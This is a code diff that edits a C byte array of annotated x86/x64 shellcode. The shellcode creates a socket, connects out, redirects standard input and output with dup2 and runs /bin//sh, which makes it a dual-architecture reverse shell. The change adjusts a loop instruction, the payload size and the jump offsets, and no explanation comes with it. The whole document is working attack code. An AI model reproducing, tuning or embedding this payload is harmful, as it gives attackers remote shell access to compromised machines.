@@ -1,5 +1,5 @@
 
-#define RS_SIZE 126
+#define RS_SIZE 128
 
 char RS[] = {
   /* 0000 */ "\xcc"                         /* int3                            */
@@ -20,55 +20,56 @@ char RS[] = {
   /* 0022 */ "\x5e"                         /* pop rsi                         */
   /* 0023 */ "\x6a\x02"                     /* push 0x2                        */
   /* 0025 */ "\x5f"                         /* pop rdi                         */
-  /* 0026 */ "\x48\x75\x15"                 /* jnz 0x3e                        */
+  /* 0026 */ "\x48\x75\x17"                 /* jnz 0x40                        */
   /* 0029 */ "\xb0\x29"                     /* mov al, 0x29                    */
   /* 002B */ "\x0f\x05"                     /* syscall                         */
   /* 002D */ "\x97"                         /* xchg edi, eax                   */
   /* 002E */ "\x96"                         /* xchg esi, eax                   */
   /* 002F */ "\xb0\x21"                     /* mov al, 0x21                    */
   /* 0031 */ "\x0f\x05"                     /* syscall                         */
-  /* 0033 */ "\x4e\x79\xf9"                 /* jns 0x2f                        */
-  /* 0036 */ "\x5e"                         /* pop rsi                         */
-  /* 0037 */ "\x5a"                         /* pop rdx                         */
-  /* 0038 */ "\xb0\x2a"                     /* mov al, 0x2a                    */
-  /* 003A */ "\x0f\x05"                     /* syscall                         */
-  /* 003C */ "\xeb\x1e"                     /* jmp 0x5c                        */
-  /* 003E */ "\x56"                         /* push rsi                        */
-  /* 003F */ "\x5b"                         /* pop rbx                         */
-  /* 0040 */ "\x52"                         /* push rdx                        */
-  /* 0041 */ "\x53"                         /* push rbx                        */
-  /* 0042 */ "\x57"                         /* push rdi                        */
-  /* 0043 */ "\x54"                         /* push rsp                        */
-  /* 0044 */ "\x59"                         /* pop rcx                         */
-  /* 0045 */ "\xcd\x80"                     /* int 0x80                        */
-  /* 0047 */ "\x93"                         /* xchg ebx, eax                   */
-  /* 0048 */ "\x59"                         /* pop rcx                         */
-  /* 0049 */ "\xb0\x3f"                     /* mov al, 0x3f                    */
-  /* 004B */ "\xcd\x80"                     /* int 0x80                        */
-  /* 004D */ "\x49\x79\xf9"                 /* jns 0x49                        */
-  /* 0050 */ "\x58"                         /* pop rax                         */
-  /* 0051 */ "\x58"                         /* pop rax                         */
-  /* 0052 */ "\x53"                         /* push rbx                        */
-  /* 0053 */ "\x54"                         /* push rsp                        */
-  /* 0054 */ "\x59"                         /* pop rcx                         */
-  /* 0055 */ "\x6a\x03"                     /* push 0x3                        */
-  /* 0057 */ "\x5b"                         /* pop rbx                         */
-  /* 0058 */ "\xb0\x66"                     /* mov al, 0x66                    */
-  /* 005A */ "\xcd\x80"                     /* int 0x80                        */
-  /* 005C */ "\x99"                         /* cdq                             */
-  /* 005D */ "\x50"                         /* push rax                        */
-  /* 005E */ "\x50"                         /* push rax                        */
+  /* 0033 */ "\x83\xee\x01"                 /* sub esi, 0x1                    */
+  /* 0036 */ "\x79\xf7"                     /* jns 0x2f                        */
+  /* 0038 */ "\x5e"                         /* pop rsi                         */
+  /* 0039 */ "\x5a"                         /* pop rdx                         */
+  /* 003A */ "\xb0\x2a"                     /* mov al, 0x2a                    */
+  /* 003C */ "\x0f\x05"                     /* syscall                         */
+  /* 003E */ "\xeb\x1e"                     /* jmp 0x5e                        */
+  /* 0040 */ "\x56"                         /* push rsi                        */
+  /* 0041 */ "\x5b"                         /* pop rbx                         */
+  /* 0042 */ "\x52"                         /* push rdx                        */
+  /* 0043 */ "\x53"                         /* push rbx                        */
+  /* 0044 */ "\x57"                         /* push rdi                        */
+  /* 0045 */ "\x54"                         /* push rsp                        */
+  /* 0046 */ "\x59"                         /* pop rcx                         */
+  /* 0047 */ "\xcd\x80"                     /* int 0x80                        */
+  /* 0049 */ "\x93"                         /* xchg ebx, eax                   */
+  /* 004A */ "\x59"                         /* pop rcx                         */
+  /* 004B */ "\xb0\x3f"                     /* mov al, 0x3f                    */
+  /* 004D */ "\xcd\x80"                     /* int 0x80                        */
+  /* 004F */ "\x49\x79\xf9"                 /* jns 0x4b                        */
+  /* 0052 */ "\x58"                         /* pop rax                         */
+  /* 0053 */ "\x58"                         /* pop rax                         */
+  /* 0054 */ "\x53"                         /* push rbx                        */
+  /* 0055 */ "\x54"                         /* push rsp                        */
+  /* 0056 */ "\x59"                         /* pop rcx                         */
+  /* 0057 */ "\x6a\x03"                     /* push 0x3                        */
+  /* 0059 */ "\x5b"                         /* pop rbx                         */
+  /* 005A */ "\xb0\x66"                     /* mov al, 0x66                    */
+  /* 005C */ "\xcd\x80"                     /* int 0x80                        */
+  /* 005E */ "\x99"                         /* cdq                             */
   /* 005F */ "\x50"                         /* push rax                        */
-  /* 0060 */ "\x54"                         /* push rsp                        */
-  /* 0061 */ "\x5b"                         /* pop rbx                         */
-  /* 0062 */ "\x53"                         /* push rbx                        */
-  /* 0063 */ "\x5f"                         /* pop rdi                         */
-  /* 0064 */ "\xc7\x07\x2f\x62\x69\x6e"     /* mov dword [rdi], 0x6e69622f     */
-  /* 006A */ "\xc7\x47\x04\x2f\x2f\x73\x68" /* mov dword [rdi+0x4], 0x68732f2f */
-  /* 0071 */ "\x40\x75\x04"                 /* jnz 0x78                        */
-  /* 0074 */ "\xb0\x3b"                     /* mov al, 0x3b                    */
-  /* 0076 */ "\x0f\x05"                     /* syscall                         */
-  /* 0078 */ "\x31\xc9"                     /* xor ecx, ecx                    */
-  /* 007A */ "\xb0\x0b"                     /* mov al, 0xb                     */
-  /* 007C */ "\xcd\x80"                     /* int 0x80                        */
+  /* 0060 */ "\x50"                         /* push rax                        */
+  /* 0061 */ "\x50"                         /* push rax                        */
+  /* 0062 */ "\x54"                         /* push rsp                        */
+  /* 0063 */ "\x5b"                         /* pop rbx                         */
+  /* 0064 */ "\x53"                         /* push rbx                        */
+  /* 0065 */ "\x5f"                         /* pop rdi                         */
+  /* 0066 */ "\xc7\x07\x2f\x62\x69\x6e"     /* mov dword [rdi], 0x6e69622f     */
+  /* 006C */ "\xc7\x47\x04\x2f\x2f\x73\x68" /* mov dword [rdi+0x4], 0x68732f2f */
+  /* 0073 */ "\x40\x75\x04"                 /* jnz 0x7a                        */
+  /* 0076 */ "\xb0\x3b"                     /* mov al, 0x3b                    */
+  /* 0078 */ "\x0f\x05"                     /* syscall                         */
+  /* 007A */ "\x31\xc9"                     /* xor ecx, ecx                    */
+  /* 007C */ "\xb0\x0b"                     /* mov al, 0xb                     */
+  /* 007E */ "\xcd\x80"                     /* int 0x80                        */
 };
